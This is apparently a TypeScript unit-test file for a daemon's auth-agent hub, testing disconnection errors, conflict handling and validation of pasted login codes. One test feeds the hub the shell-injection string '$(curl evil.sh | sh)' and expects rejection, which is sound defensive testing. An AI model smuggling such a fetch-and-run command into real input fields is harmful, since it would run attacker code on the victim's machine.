...
import { createAuthAgentHub, parseAgentViewMsg, type AgentOp } from '@/daemon/auth-agent'
...
describe('createAuthAgentHub', () => {
  ...
  it('rejects a start with AUTH_AGENT_DISCONNECTED when no agent is connected', () => {
    ...
    try {
      ...
      expect((err as DaemonError).code).toBe('AUTH_AGENT_DISCONNECTED')
      expect((err as DaemonError).message).toMatch(/yaac auth (update|daemon start)/)
    }
  })
  ...
  it('validates paste input daemon-side and forwards clean codes', () => {
    const { sent, sock } = fakeSocket()
    hub.setSocket(sock)
    const v = hub.startLogin('claude')

    expect(() => hub.sendLoginInput(v.id, '$(curl evil.sh | sh)')).toThrow(DaemonError)
  ...
  it('rejects input once the flow is terminal', () => {
    ...
    try {
      ...
      expect((err as DaemonError).code).toBe('CONFLICT')
    }
    hub.clearForTests()
  })
